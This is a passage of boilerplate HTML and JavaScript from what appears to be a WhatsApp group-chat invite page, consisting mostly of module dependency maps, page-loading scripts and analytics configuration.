                        "r": ["2mTEsTN", "xcdI0h0", "aD87j25", "RbyjfYU", "PAVzyjJ", "kFwZFWQ", "jZNkHPB", "ULMb96V", "66LEdgI", "W+9jPib", "1wf6lws", "AI5R1m1", "K+ug04c"],
                        "rds": {
                            "m": ["FbtLogging", "IntlQtEventFalcoEvent"],
                            "r": ["a2YBUdi"]
                        },
                        "be": 1
                    },
                    "AsyncDialog": {
                        "r": ["2mTEsTN", "kFwZFWQ", "nf73y6G", "pTiq2PW", "66LEdgI", "jZNkHPB", "ULMb96V", "E8Hy2Pc", "3tF3AbD", "AI5R1m1", "LwCHt1K", "QQ8F2MA", "LgMd2Au", "UWb2FGB", "qu5W65u", "8PkfUmd", "TBDk0Kt", "a2YBUdi", "oJnNL9m", "AmWszAw", "OrjqgXG"],
                        "rds": {
                            "m": ["FbtLogging", "IntlQtEventFalcoEvent"]
                        },
                        "be": 1
                    },
                    "Hovercard": {
                        "r": ["2mTEsTN", "jZNkHPB", "ULMb96V", "mtchIYY", "kFwZFWQ", "aIBG+Oh", "pTiq2PW", "66LEdgI", "E8Hy2Pc", "AI5R1m1", "qu5W65u", "P\/AHfvj", "AmWszAw", "XCLwaXB", "5oyRvYY", "3tF3AbD", "LT3CYaZ", "a2YBUdi"],
                        "rds": {
                            "m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "PageTransitions", "Animation"]
                        },
                        "be": 1
                    },
                    "XSalesPromoWWWDetailsDialogAsyncController": {
                        "r": ["gWMJgTe"],
                        "be": 1
                    },
                    "XOfferController": {
                        "r": ["hIek+bG"],
                        "be": 1
                    },
                    "PerfXSharedFields": {
                        "r": ["QQ8F2MA", "2mTEsTN"],
                        "be": 1
                    },
                    "ODS": {
                        "r": ["2mTEsTN", "a2YBUdi"],
                        "be": 1
                    },
                    "Dialog": {
                        "r": ["2mTEsTN", "kFwZFWQ", "qu5W65u", "E8Hy2Pc", "AI5R1m1", "jZNkHPB", "pTiq2PW", "66LEdgI", "ULMb96V", "DCGHDqp", "lGcuWFY"],
                        "rds": {
                            "m": ["FbtLogging", "IntlQtEventFalcoEvent", "Animation", "PageTransitions", "BanzaiScuba_DEPRECATED"],
                            "r": ["a2YBUdi"]
                        },
                        "be": 1
                    },
                    "ExceptionDialog": {
                        "r": ["2mTEsTN", "nf73y6G", "pTiq2PW", "kFwZFWQ", "66LEdgI", "jZNkHPB", "ULMb96V", "E8Hy2Pc", "3tF3AbD", "AI5R1m1", "LwCHt1K", "QQ8F2MA", "LgMd2Au", "UWb2FGB", "qu5W65u", "oJnNL9m", "a2YBUdi", "Tk4DaGt", "ZiJ0ZNW", "yepR3j\/", "UpN0wOw"],
                        "rds": {
                            "m": ["FbtLogging", "IntlQtEventFalcoEvent"]
                        },
                        "be": 1
                    },
                    "QuickSandSolver": {
                        "r": ["2mTEsTN", "kFwZFWQ", "66LEdgI", "8ELCBwH", "3iqJyp9", "xiSecOk", "ULMb96V"],
                        "rds": {
                            "m": ["FbtLogging", "IntlQtEventFalcoEvent"],
                            "r": ["a2YBUdi"]
                        },
                        "be": 1
                    },
                    "ConfirmationDialog": {
                        "r": ["2mTEsTN", "66LEdgI", "kFwZFWQ", "oE4DofT", "ULMb96V"],
                        "be": 1
                    }
                }
            })
        });
    </script>
    <script>
        requireLazy(["InitialJSLoader"], function(InitialJSLoader) {
            InitialJSLoader.loadOnDOMContentReady(["2mTEsTN", "kFwZFWQ", "a2YBUdi"]);
        });
    </script>
    <script>
        requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
            var s = (new ServerJS());
            s.handle({
                "elements": [
                    ["__elem_0cdc66ad_0_0_cv", "lang", 1],
                    ["__elem_a588f507_0_0_9Q", "lang-picker_bg", 1]
                ],
                "require": [
                    ["WhatsAppApiOpenUrl", "open_custom_url", [],
                        [{
                            "url": "whatsapp:\/\/chat\/?code=FMCUd5UuooX7zA9uKvky4B",
                            "userAgentMetadata": {
                                "browser": "Other",
                                "isMobile": false
                            },
                            "shouldAutoload": false
                        }]
                    ],
                    ["ScriptPath", "set", [],
                        ["WAXWhatsAppChatInviteController", "a1f3c513", {
                            "imp_id": "0sw6RQNa4jDG1C3i6",
                            "ef_page": null,
                            "uri": "https:\/\/chat.whatsapp.com\/--sanitized-S228802--?lang=en"
                        }]
                    ],
                    ["WhatsAppWebPage", "makeFixedHeaderTransluscent", [],
                        ["_2zpg", "_2zpm", false]
                    ],
                    ["WhatsAppWebPage", "initSearchToggle", [],
                        []
                    ],
                    ["WhatsAppWebPage", "initLanguagePickerToggle", ["__elem_0cdc66ad_0_0_cv"],
                        [{
                            "__m": "__elem_0cdc66ad_0_0_cv"
                        }, "lang-picker"]
                    ],
                    ["WhatsAppWebPage", "initLanguagePickerToggle", ["__elem_a588f507_0_0_9Q"],
                        [{
                            "__m": "__elem_a588f507_0_0_9Q"
                        }, "lang-picker"]
                    ],
                    ["WhatsAppWebPage", "initMobileMenu", [],
                        []
                    ],
                    ["TimeSliceImpl"],
                    ["HasteSupportData"],
                    ["ServerJS"],
                    ["Run"],
                    ["InitialJSLoader"]
                ]
            });
            requireLazy(["Run"], function(Run) {
                Run.onAfterLoad(function() {
                    s.cleanup(TimeSlice)
                })
            });
        });
    </script>
    <script>
        now_inl = (function() {
            var p = window.performance;
            return p && p.now && p.timing && p.timing.navigationStart ? function() {
                return p.now() + p.timing.navigationStart
            } : function() {
                return new Date().getTime()
            };
        })();
        window.__bigPipeFR = now_inl();
    </script>
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/l/0,cross/li1FVv8ji_p.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/l/0,cross/bnJ_4exZTkM.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <script>
        window.__bigPipeCtor = now_inl();
        requireLazy(["BigPipe"], function(BigPipe) {
            define("__bigPipe", [], window.bigPipe = new BigPipe({
                "forceFinish": true,
                "config": null
            }));
        });
    </script>
    <script nonce="ZGTlWaQE">
        (function() {
            var n = now_inl();
            requireLazy(["__bigPipe"], function(bigPipe) {
                bigPipe.beforePageletArrive("first_response", n);
            })
        })();
    </script>
    <script nonce="ZGTlWaQE">
        requireLazy(["__bigPipe"], (function(bigPipe) {
            bigPipe.onPageletArrive({
                displayResources: ["w0wbZxI", "ULMb96V"],
                id: "first_response",
                phase: 0,
                last_in_phase: true,
                tti_phase: 0,
                hsrp: {
                    hblp: {
                        sr_revision: 1003834407,
                        consistency: {
                            rev: 1003834407
                        }
                    }
                },
                allResources: ["w0wbZxI", "ULMb96V", "2mTEsTN", "kFwZFWQ", "a2YBUdi"]
            });
        }));
    </script>
    <script>
        requireLazy(["__bigPipe"], function(bigPipe) {
            bigPipe.setPageID("6964743093834304946-0")
        });
        CavalryLogger.setPageID("6964743093834304946-0");
    </script>
    <script nonce="ZGTlWaQE">
        (function() {
            var n = now_inl();
            requireLazy(["__bigPipe"], function(bigPipe) {
                bigPipe.beforePageletArrive("last_response", n);
            })
        })();
    </script>
    <script nonce="ZGTlWaQE">
        requireLazy(["__bigPipe"], (function(bigPipe) {
            bigPipe.onPageletArrive({
                displayResources: ["a2YBUdi", "ULMb96V"],
                id: "last_response",
                phase: 1,
                last_in_phase: true,
                the_end: true,
                jsmods: {
                    define: [
                        ["cr:1353359", ["EventListenerImplForBlue"], {
                            __rc: ["EventListenerImplForBlue", "Aa39gvK9shKlfPN4P8gNZQuhjAfhZlHBSQAGkCubQFUmHNWaUS5SY4jzSHuUUyUx2nTvXEVUzbUMzXMy1EnXvSAumvIHmf9uIA"]
                        }, -1],
                        ["IntlCurrentLocale", [], {
                            code: "id_ID"
                        }, 5954],
                        ["KillabyteProfilerConfig", [], {
                            htmlProfilerModule: null,
                            profilerModule: null,
                            depTypes: {
                                BL: "bl",
                                NON_BL: "non-bl"
                            }
                        }, 1145],
                        ["QuicklingConfig", [], {
                            version: "1003834407;0;",
                            sessionLength: 30,
                            inactivePageRegex: "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
                            badRequestKeys: ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"],
                            logRefreshOverhead: false
                        }, 60],
                        ["BrowserPaymentHandlerConfig", [], {
                            enabled: false
                        }, 3904],
                        ["TimeSpentConfig", [], {
                            "0_delay": 0,
                            "0_timeout": 8,
                            delay: 1000,
                            timeout: 64
                        }, 142],
                        ["TrackingConfig", [], {
                            domain: "https://pixel.facebook.com"
                        }, 325],
                        ["cr:844180", ["TimeSpentImmediateActiveSecondsLoggerBlue"], {
                            __rc: ["TimeSpentImmediateActiveSecondsLoggerBlue", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                        }, -1],
                        ["cr:1187159", ["BlueCompatBroker"], {
                            __rc: ["BlueCompatBroker", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                        }, -1],
                        ["cr:1634616", ["UserActivityBlue"], {
                            __rc: ["UserActivityBlue", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                        }, -1],
                        ["ImmediateActiveSecondsConfig", [], {
                            sampling_rate: 0
                        }, 423]
                    ],
                    require: [
                        ["CavalryLoggerImpl", "startInstrumentation", [],
                            []
                        ],
                        ["NavigationMetrics", "setPage", [],
                            [{
                                page: "WAXWhatsAppChatInviteController",
                                page_type: "normal",
                                page_uri: "https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=en",
                                serverLID: "6964743093834304946-0"
                            }]
                        ],
                        ["FalcoLoggerTransports", "attach", [],
                            []
                        ],
                        ["Chromedome", "start", [],
                            [{}]
                        ],
                        ["DimensionTracking"],
                        ["HighContrastMode", "init", [],
                            [{
                                isHCM: false,
                                spacerImage: "https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/-PAXP-deijE.gif"
                            }]
                        ],
                        ["NavigationClickPointHandler"],
                        ["ServiceWorkerURLCleaner", "removeRedirectID", [],
                            []
                        ],
                        ["Artillery", "disable", [],
                            []
                        ],
                        ["ScriptPathLogger", "startLogging", [],
                            []
                        ],
                        ["TimeSpentBitArrayLogger", "init", [],
                            []
                        ],
                        ["ClickRefLogger"],
                        ["DetectBrokenProxyCache", "run", [],
                            [0, "c_user"]
                        ],
                        ["RequireDeferredReference", "unblock", [],
                            [
                                ["VisualCompletionGating", "FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"]
                            ]
                        ]
                    ]
                },
                hsrp: {
                    hsdp: {
                        clpData: {
                            "1838142": {
                                r: 1,
                                s: 1
                            },
                            "1829319": {
                                r: 1
                            },
                            "1743690": {
                                r: 1
                            },
                            "1829320": {
                                r: 1
                            },
                            "1843988": {
                                r: 1
                            }
                        },
                        gkxData: {
                            "1167394": {
                                result: false,
                                hash: "AT7BpN-tlUPwbIIFYMY"
                            }
                        }
                    },
                    hblp: {
                        sr_revision: 1003834407,
                        consistency: {
                            rev: 1003834407
                        },
                        rsrcMap: {
                            FEt5GzN: {
                                type: "js",
                                src: "https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/JopZtdti8dq.js?_nc_x=Ij3Wp8lg5Kz"
                            }
                        },
                        compMap: {
                            TransportSelectingClientSingleton: {
                                r: ["mtchIYY", "8PkfUmd", "2mTEsTN", "a2YBUdi", "jZNkHPB"],
                                rds: {
                                    m: ["ContextualConfig", "BladeRunnerClient", "BanzaiScuba_DEPRECATED", "DGWRequestStreamClient", "MqttLongPollingRunner"],
                                    r: ["kxMPtsn", "66LEdgI", "l0NE8Iw", "kFwZFWQ"]
                                },
                                be: 1
                            },
                            RequestStreamCommonRequestStreamCommonTypes: {
                                r: ["mtchIYY"],
                                be: 1
                            }
                        }
                    }
                },
                allResources: ["2mTEsTN", "QQ8F2MA", "a2YBUdi", "FEt5GzN", "kFwZFWQ", "ULMb96V"],
                onload: ["CavalryLogger.getInstance(\"6964743093834304946-0\").setTTIEvent(\"t_domcontent\");"],
                onafterload: ["CavalryLogger.getInstance(\"6964743093834304946-0\").collectBrowserTiming(window)", "window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");", "if (window.ExitTime){CavalryLogger.getInstance(\"6964743093834304946-0\").setValue(\"t_exit\", window.ExitTime);};"]
            });
        }));
    </script>
</body>

</html>